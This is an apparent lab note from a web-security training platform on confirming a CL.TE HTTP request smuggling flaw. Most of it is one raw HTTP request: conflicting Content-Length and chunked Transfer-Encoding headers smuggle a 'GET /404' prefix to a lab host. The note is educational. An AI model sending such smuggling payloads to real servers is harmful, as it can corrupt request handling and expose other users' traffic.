____

# HTTP request smuggling, confirming a CL.TE vulnerability via differential responses


```
POST / HTTP/1.1
Host: 0ad900fc04a5e02480c97b4300e60060.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

![[Pasted image 20240815043936.png]]